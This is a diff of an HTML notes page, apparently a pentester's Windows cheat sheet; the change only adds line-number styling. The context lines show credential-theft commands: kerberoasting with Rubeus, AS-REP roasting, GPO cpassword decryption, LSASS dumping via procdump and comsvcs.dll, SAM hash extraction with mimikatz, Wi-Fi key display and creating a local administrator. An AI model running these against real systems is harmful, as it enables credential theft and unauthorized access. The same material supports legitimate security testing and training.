@@ -306,7 +306,7 @@
               <h1 id="windows">Windows</h1>
 <h3 id="kerberosunconstraineddelegation">KerberosUnConstrainedDelegation</h3>
 <p>More information <a href="https://adsecurity.org/?p=1667" target="_blank">here</a></p>
-<pre><code class="language-powerhsell">$ Import-Module ActiveDirectory
+<pre><code class="language-powerhsell line-numbers">$ Import-Module ActiveDirectory
 $ Get-ADComputer -Filter {(TrustedForDelegation -eq $True) -AND (PrimaryGroupID -eq 515)} -Properties 'TrustedForDelegation,TrustedToAuthForDelegation,servicePrincipalName,Description'
 
 # UserAccountControl &amp; 0x80000 (TRUSTED_FOR_DELEGATION)
@@ -318,13 +318,13 @@ $ foreach($c in $computers) { echo &quot;$($c.name) ($($c.useraccountcontrol))&q
 <p>The website <a href="https://ldapwiki.com/wiki/" target="_blank">LdapWiki</a> explains how to write a LDAP query. For instance,
 if we want to use bitwise in ldap queries, we need to use some special arguments.</p>
 <p>There are two Bitwise operation Extensible Match Rules.</p>
-<pre><code>1.2.840.113556.1.4.803 which is also referred to as LDAP_MATCHING_RULE_BIT_AND (Bitwise AND)
+<pre><code class="language-none line-numbers">1.2.840.113556.1.4.803 which is also referred to as LDAP_MATCHING_RULE_BIT_AND (Bitwise AND)
 1.2.840.113556.1.4.804 which is also referred to as LDAP_MATCHING_RULE_BIT_OR (Bitwise OR)
 </code></pre>
 
 <p><img alt="" src="https://adsecurity.org/wp-content/uploads/2015/08/KerberosUnConstrainedDelegation-PowerShell-DiscoverServers2.png" /></p>
 <p>With <a href="https://github.com/GhostPack/Rubeus" target="_blank">Rubeus</a>, it's possible to dump the hashes:</p>
-<pre><code class="language-bash">Rubeus.exe kerberoast /creduser:&quot;&lt;fqdn_dom&gt;\&lt;user&gt;&quot; /credpassword:&quot;&lt;password&gt;&quot; /domain:&quot;&lt;fqdn_dom&gt;&quot; /outfile:&quot;kerberoast.hash.txt&quot;
+<pre><code class="language-bash line-numbers">Rubeus.exe kerberoast /creduser:&quot;&lt;fqdn_dom&gt;\&lt;user&gt;&quot; /credpassword:&quot;&lt;password&gt;&quot; /domain:&quot;&lt;fqdn_dom&gt;&quot; /outfile:&quot;kerberoast.hash.txt&quot;
 </code></pre>
 
 <h3 id="kerberos-preauthentication">Kerberos preauthentication</h3>
@@ -338,12 +338,12 @@ the user password. So the clear password can be retrieve with a brute-force atta
 </ul>
 <p>Then you can use the <code>impacket</code> script <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py" target="_blank"><code>GetNPUsers.py</code></a>
 to get the TGT in a format the <code>John</code> or <code>Hashcat</code> can brute-force:</p>
-<pre><code class="language-bash">python GetNPUsers.py &lt;domain&gt;/ -usersfile users.txt -format &lt;john/empty&gt; -outputfile hashes.txt
+<pre><code class="language-bash line-numbers">python GetNPUsers.py &lt;domain&gt;/ -usersfile users.txt -format &lt;john/empty&gt; -outputfile hashes.txt
 </code></pre>
 
 <p>From <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py" target="_blank">@harmj0y</a>.</p>
 <h3 id="collect-ad-users-information">Collect AD users information</h3>
-<pre><code class="language-powerhsell"># Helping functions
+<pre><code class="language-powerhsell line-numbers"># Helping functions
 function Get-ADUserDirectoryEntry($user) {
     return (New-Object System.DirectoryServices.DirectorySearcher(&quot;(&amp;(objectCategory=User)(samAccountName=$user))&quot;)).FindOne().GetDirectoryEntry()
 }
@@ -378,7 +378,7 @@ foreach($user in $DomainAdmins) { echo &quot;$($user.displayname) ($($user.samac
 </code></pre>
 
 <h3 id="decrypt-gpo-with-cpassword">Decrypt GPO with cpassword</h3>
-<pre><code class="language-python">#!/usr/bin/python
+<pre><code class="language-python line-numbers">#!/usr/bin/python
 
 import sys
 import binascii
@@ -417,7 +417,7 @@ if __name__ == &quot;__main__&quot;:
 <h3 id="use-win32-api-in-python">Use Win32 API in Python</h3>
 <p>Download then install the pip package <code>pywin32</code> here: <a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/#pywin32" target="_blank">https://www.lfd.uci.edu/~gohlke/pythonlibs/#pywin32</a></p>
 <h3 id="get-ntp-configuration-server">Get NTP configuration server</h3>
-<pre><code class="language-bash">$ w32tm /query /status
+<pre><code class="language-bash line-numbers">$ w32tm /query /status
 </code></pre>
 
 <h3 id="windows-10-versions">Windows 10 versions</h3>
@@ -432,43 +432,43 @@ if __name__ == &quot;__main__&quot;:
 <li><a href="https://github.com/Hackndo/lsassy" target="_blank">lsassy</a></li>
 </ul>
 <h4 id="procdump">Procdump</h4>
-<pre><code class="language-bash">procdump -accepteula -ma lsass.exe lsass.dmp
+<pre><code class="language-bash line-numbers">procdump -accepteula -ma lsass.exe lsass.dmp
 </code></pre>
 
 <h4 id="rundll32-comsvcsdll">Rundll32 &amp; comsvcs.dll</h4>
-<pre><code class="language-bash">tasklist /fi &quot;imagename eq lsass.exe&quot;
+<pre><code class="language-bash line-numbers">tasklist /fi &quot;imagename eq lsass.exe&quot;
 rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump &lt;PID&gt; lsass.dmp full
 </code></pre>
 
 <h3 id="sam-and-system-backup">SAM and SYSTEM backup</h3>
-<pre><code class="language-bash">$ reg save HKLM\SYSTEM SystemBkup.hiv
+<pre><code class="language-bash line-numbers">$ reg save HKLM\SYSTEM SystemBkup.hiv
 $ reg save HKLM\SAM SamBkup.hiv
 </code></pre>
 
 <p>Then with <code>mimikatz</code> you can recover the hashes:</p>
-<pre><code class="language-bash">$ lsadump::sam /system:SystemBkup.hiv /sam:SamBkup.hiv
+<pre><code class="language-bash line-numbers">$ lsadump::sam /system:SystemBkup.hiv /sam:SamBkup.hiv
 </code></pre>
 
 <h3 id="list-email-aliases">List Email aliases</h3>
-<pre><code class="language-bash">$ (Get-ADUser -Identity &lt;user_ad_id&gt; -Properties proxyAddresses).proxyAddresses
+<pre><code class="language-bash line-numbers">$ (Get-ADUser -Identity &lt;user_ad_id&gt; -Properties proxyAddresses).proxyAddresses
 </code></pre>
 
 <h3 id="truster-account">Truster Account</h3>
 <p>The <a href="https://www.sstic.org/media/SSTIC2014/SSTIC-actes/secrets_dauthentification_pisode_ii__kerberos_cont/SSTIC2014-Article-secrets_dauthentification_pisode_ii__kerberos_contre-attaque-bordes_2.pdf" target="_blank">PDF</a> from SSTIC 2014 describes trusts accounts on Windows:</p>
-<pre><code>sAMAccountType: 805306370 = ( TRUST_ACCOUNT );
+<pre><code class="language-none line-numbers">sAMAccountType: 805306370 = ( TRUST_ACCOUNT );
 </code></pre>
 
 <h3 id="compile-net-without-visual-studio">Compile .Net without Visual Studio</h3>
-<pre><code class="language-bash">$ cd \Windows\Microsoft.NET\Framework\v4*
+<pre><code class="language-bash line-numbers">$ cd \Windows\Microsoft.NET\Framework\v4*
 $ msbuild &quot;path\to\SharpUp-master\SharpUp.sln&quot; /t:Rebuild /p:Configuration=Release /p:Platform=&quot;Any CPU&quot;
 </code></pre>
 
 <p>Or to compile a single file:</p>
-<pre><code class="language-bash">$ cd \Windows\Microsoft.NET\Framework\v4.0.30319
+<pre><code class="language-bash line-numbers">$ cd \Windows\Microsoft.NET\Framework\v4.0.30319
 $ csc.exe /t:exe /out:path\to\main.exe path\to\main.cs
 </code></pre>
 
-<pre><code class="language-csharp">using System;
+<pre><code class="language-csharp line-numbers">using System;
 
 public class HelloWorld {
     public static void Main()
@@ -479,31 +479,31 @@ public class HelloWorld {
 </code></pre>
 
 <h3 id="list-wifi-networks-and-password">List Wifi networks and password</h3>
-<pre><code class="language-bash">$ netsh wlan show profile
+<pre><code class="language-bash line-numbers">$ netsh wlan show profile
 $ netsh wlan show profile &lt;WiFi name&gt; key=clear
 </code></pre>
 
 <h3 id="tcp-dump-with-netsh">TCP dump with netsh</h3>
 <p>You can use <code>netsh trace</code> to dump TCP connexions on a Windows system. The following
 command start a service that dump the packets:</p>
-<pre><code class="language-bash">$ netsh trace start scenario=NetConnection capture=yes report=yes persistent=no maxsize=1024 correlation=yes traceFile=C:\Temp\NetTrace.etl
+<pre><code class="language-bash line-numbers">$ netsh trace start scenario=NetConnection capture=yes report=yes persistent=no maxsize=1024 correlation=yes traceFile=C:\Temp\NetTrace.etl
 </code></pre>
 
 <p>To start to service, you need to type:</p>
-<pre><code class="language-bash">$ netsh trace stop
+<pre><code class="language-bash line-numbers">$ netsh trace stop
 </code></pre>
 
 <p>When the service is stopped, it create an <code>etl</code> file (and a <code>cab</code> for the report)
 that contains the packets. To import it to Wireshark, you need to convert the file
 to a <code>pcap</code> file. The tool <code>etl2pcapng</code> can be used to convert the file. It's
 available on <a href="https://github.com/microsoft/etl2pcapng" target="_blank">Github</a>.</p>
-<pre><code class="language-bash">$ etl2pcapng.exe NetTrace.etl  NetTrace.pcapng
+<pre><code class="language-bash line-numbers">$ etl2pcapng.exe NetTrace.etl  NetTrace.pcapng
 IF: medium=eth  ID=0    IfIndex=13
 Converted 3948 frames
 </code></pre>
 
 <h3 id="add-user-to-local-admin">Add user to local admin</h3>
-<pre><code class="language-bash"># create a local user
+<pre><code class="language-bash line-numbers"># create a local user
 $ net user &lt;username&gt; &lt;password&gt; /add
 # add user to local admin group
 $ net localgroup Administrators &lt;username&gt; /add
@@ -513,7 +513,7 @@ $ net localgroup Administrators &lt;username&gt; /add
 <p>A Windows Update is a <code>.msu</code> archive that contains a <code>.cab</code> archive. This file
 contains the new binaries (<code>.dll</code>, <code>.exe</code>, ...). To extract the two archive you
 can use the <code>expand</code> command:</p>
-<pre><code class="language-bash">expand -f:* &quot;update.msu&quot; &quot;%temp%\\update.msu&quot;
+<pre><code class="language-bash line-numbers">expand -f:* &quot;update.msu&quot; &quot;%temp%\\update.msu&quot;
 expand -f:* &quot;%temp%\\update.msu\\update.cab&quot; &quot;%temp%\\update.msu\\update.cab&quot;
 </code></pre>
             
@@ -544,6 +544,7 @@ expand -f:* &quot;%temp%\\update.msu\\update.cab&quot; &quot;%temp%\\update.msu\
     <script>var base_url = '..';</script>
     <script src="../js/theme.js"></script>
     <script src="../js/prism-core.min.js"></script>
+    <script src="../js/prism-line-numbers.min.js"></script>
     <script src="../js/prism-clike.min.js"></script>
     <script src="../js/prism-yaml.min.js"></script>
     <script src="../js/prism-powershell.min.js"></script>
